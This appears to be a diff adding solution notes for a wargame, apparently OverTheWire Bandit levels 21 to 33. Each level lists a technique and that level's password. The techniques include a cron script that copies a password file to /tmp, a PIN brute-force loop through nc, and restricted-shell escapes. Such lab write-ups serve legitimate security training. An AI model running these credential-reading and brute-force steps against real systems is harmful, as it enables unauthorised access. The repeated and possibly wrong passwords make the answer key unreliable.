@@ -1,0 +1,57 @@
+Level 21:  
+- Exploit cronjobs: Check `/etc/cron.d/`, analyze scripts.  
+- Password: `gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr`  
+
+Level 22:  
+- Decode cronjob logic:  
+  `echo I am user bandit23 | md5sum | cut -d ' ' -f 1`.  
+- Password: `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`  
+
+Level 23:  
+- Write a script to be executed by cron:  
+  `echo "cat /etc/bandit_pass/bandit24 > /tmp/mypass" > script.sh`.  
+- Password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`  
+
+Level 24:  
+- Bruteforce a PIN:  
+  `for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"; done | nc localhost 30002`.  
+- Password: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`  
+
+Level 25:  
+- Bypass restricted shell (using `more` + `vim`):  
+  1. Resize terminal to trigger `more`.  
+  2. Press `v` to open `vim`, then run `:set shell=/bin/bash` and `:shell`.  
+- Password: `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`  
+
+Level 26:  
+- After escaping restricted shell, `cat /etc/bandit_pass/bandit26`.  
+- Password: `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`  
+
+Level 27:  
+- Git clone:  
+  `git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo`.  
+- Password: `3ba3118a22e93127a4ed485be72ef5ea`  
+
+Level 28:  
+- Check Git history: `git show remotes/origin/HEAD`.  
+- Password: `0ef186ac70e04ea33b4c1853d2526fa2`  
+
+Level 29:  
+- Check Git branches: `git branch -a`, then inspect each.  
+- Password: `bbc96594b4e001778eee9975372716b2`  
+
+Level 30:  
+- Check Git tags: `git tag`, then `git show secret`.  
+- Password: `5b90576bedb2cc04c86a9e924ce42faf`  
+
+Level 31:  
+- Push a file to Git:  
+  `echo "May I come in?" > key.txt`, then `git add/commit/push`.  
+- Password: `47e603bb428404d265f59c42920d81e5`  
+
+Level 32:  
+- Escape uppercase shell: Type `$0` to spawn a normal shell.  
+- Password: `56a9bf19c63d650ce78e6ec0354ee45e`  
+
+Level 33:  
+- Not available yet.:(
